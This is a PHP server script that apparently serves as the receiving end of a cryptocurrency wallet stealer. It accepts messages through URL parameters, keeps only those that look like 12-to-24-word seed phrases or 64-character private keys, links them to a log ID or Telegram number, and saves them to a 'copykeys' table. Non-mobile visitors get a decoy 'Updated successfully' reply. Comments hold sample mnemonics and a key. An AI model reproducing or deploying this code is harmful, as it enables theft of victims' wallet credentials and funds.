<?php
if(isset($_GET['IS_PC'])) $is_pc = $_GET['IS_PC'];
else $is_pc = '0';
if($is_pc == 0) $is_pc = '0';
if($is_pc == 1) $is_pc = '1';

function isMobile() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

if(($is_pc == '0') && (isMobile() == false)) {
	echo "Updated successfully";
	return;
}

if(($is_pc != '0') && ($is_pc != '1')) {
	echo "Updated successfully";
	return;
}

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "buchananapp_pc";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
$conn->set_charset('utf8mb4'); // charset

$logId = isset($_GET['ID']) ?  $_GET['ID'] : '';
$phonenumber = isset($_GET['PHONENUMBER']) ?  $_GET['PHONENUMBER'] : '';
$msg = isset($_GET['MESSAGE']) ?  $_GET['MESSAGE'] : '';

if($logId == '') return;

if(isset($_GET['ID']) && (strlen($logId) > 10) ) {
	return;
}
if(isset($_GET['PHONENUMBER']) && (strlen($phonenumber) > 15)) {
	return;
}

ini_set("allow_url_fopen", 1);

// $phonenumber = '123456';
// $smsmsg = '请勿将助记词透漏给任何人 何人 fall unfold culter client, embody circle library crane sleep 切记： 请勿将助记词透漏给任何人';

if($msg == '') {
   echo "Success";
   $conn->close();
   return;
} else {
   //check mnemonic(12-24 english words) and walletkey(64bytes, alpha and number)
   //6da940f166295bbb5e034242a595d6cabe0e4fecc6d4e2a4b0baa70bad3193a1
   //point long drastic aspect sample enable excess fragile tool tilt energy gift
   $isKey = false;
   $wordCount = 0;
   $arr = explode(' ', $msg);   
   for($i=0;$i<count($arr);$i++) {
      echo "separated - ".$arr[$i].'</br>';
      if(strlen($arr[$i]) == 64) {
         echo 'separated 64bytes ';
         if(ctype_alnum($arr[$i])) {
            $isKey = true;
            break;
         } else {
            if ($wordCount >= 12 && $wordCount <= 24) {
               $isKey = true;
					break;
				}
				$wordCount = 0;
         }
      } else {
         if(ctype_alpha($arr[$i])) {
            $wordCount++;
         } else {
            if ($wordCount >= 12 && $wordCount <= 24) {
               $isKey = true;
					break;
				}
            $wordCount = 0;
         }
      }
   }

   if ($wordCount >= 12 && $wordCount <= 24) {
      $isKey = true;
   }
   if($isKey == false) return;
}

if(($logId != '') && ($phonenumber == '')) {
   $stmt = $conn->prepare('SELECT * FROM logs WHERE ID = ?');
   $stmt->bind_param('s', $logId);
   $stmt->execute();
   $result = $stmt->get_result();  
   if ($result->num_rows > 0) {
      $row = $result->fetch_assoc();
      $phonenumber = $row["TG_NUMBER"];
   }
}

$stmt = $conn->prepare('SELECT * FROM copykeys WHERE logid=? and phonenumber=? and msg=?');
$stmt->bind_param('iss', $logId, $phonenumber, $msg);
$stmt->execute();
$result = $stmt->get_result();  
if ($result->num_rows > 0) {
   echo "Updated successfully";
   return;
}

$stmt = $conn->prepare("INSERT INTO copykeys (logid, phonenumber, msg, created_at, updated_at)
VALUES (?, ?, ?, now(), now() );");
$stmt->bind_param('iss', $logId, $phonenumber, $msg);
if($stmt->execute() === TRUE) {
   echo "Copykey record created successfully";
} else {
   echo "Copykey record Insert Error: " . $conn->error;
}

$conn->close();

?>
